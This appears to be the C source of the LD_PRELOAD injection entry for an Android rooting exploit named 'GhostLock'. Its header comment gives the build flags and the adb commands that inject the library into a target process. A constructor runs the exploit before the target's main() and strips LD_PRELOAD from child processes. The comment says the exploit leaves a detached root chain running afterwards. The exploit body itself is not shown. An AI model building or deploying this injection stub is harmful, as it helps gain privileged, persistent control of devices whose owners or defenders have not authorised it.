/*
 * GhostLock — LD_PRELOAD injection entry
 *
 * Build this core as a real shared library (-shared -fPIC) and inject it
 * with:
 *   adb push preload.so /data/local/tmp/
 *   adb shell "LD_PRELOAD=/data/local/tmp/preload.so <target>"
 *
 * The constructor runs the full exploit before the target's own main(),
 * then returns and lets the target continue.  The rooted chain (ksud
 * late-load + module watch) is detached by the exploit itself, so it
 * survives even a short-lived target like /system/bin/true.
 *
 * Pattern mirrors the classic ghostlock preload route
 * (duchamp-root/src/preload.c).
 */

#include "common.h"

__attribute__((constructor)) static void ghostlock_preload_init(void) {
  static int started;
  if (started) {
    return;
  }
  started = 1;

  /* fork()/exec() children inherit LD_PRELOAD; strip it so the exploit's
   * children do not re-enter this constructor recursively. */
  unsetenv("LD_PRELOAD");

  char *argv[2] = {"preload.so", NULL};
  pr_success("preload starting pid=%d\n", getpid());
  run_exploit(1, argv);
}
